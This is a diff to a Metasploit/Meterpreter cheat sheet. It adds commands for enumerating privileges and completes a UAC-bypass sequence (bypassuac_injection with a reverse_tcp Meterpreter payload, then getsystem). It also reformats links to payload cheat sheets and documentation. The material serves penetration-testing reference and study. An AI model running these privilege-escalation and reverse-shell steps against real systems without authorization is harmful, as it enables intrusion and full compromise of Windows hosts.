@@ -121,6 +121,15 @@ use post/windows/gather/enum_services
 ```bash
 meterpreter > run getgui -h
 ```
+##### List Enabled Process Privileges
+```bash
+meterpreter > getprivs
+```
+##### List Windows Privileges and UAC Status
+```bash
+use post/windows/gather/win_privs
+set SESSION <Session #>
+```
 
 ### Migrate to Another Process 
 ##### Migrate to Another Process Automatically (Windows)
@@ -604,8 +613,12 @@ run
 
 # If UAC is enabled
 search bypassuac
-use
+use bypassuac_injection
 set SESSION <Session #>
+# The target and the payload must match the Windows architecture (x86 or x64).
+show targets
+set TARGET <Target #>
+set PAYLOAD windows/meterpreter/reverse_tcp or windows/x64/meterpreter/reverse_tcp
 exploit
 
 getsystem
@@ -625,9 +638,11 @@ exploit
 ```
 
 # Cheatsheets
-[MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter)](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
+##### [MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter)](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
 
 # References
-[Deep Dive Into Stageless Meterpreter Payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)
+##### [Official Documentation](https://docs.rapid7.com/metasploit/)
 
-[Metasploit Module Library](https://www.infosecmatter.com/metasploit-module-library/)
+##### [Deep Dive Into Stageless Meterpreter Payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)
+
+##### [Metasploit Module Library](https://www.infosecmatter.com/metasploit-module-library/)
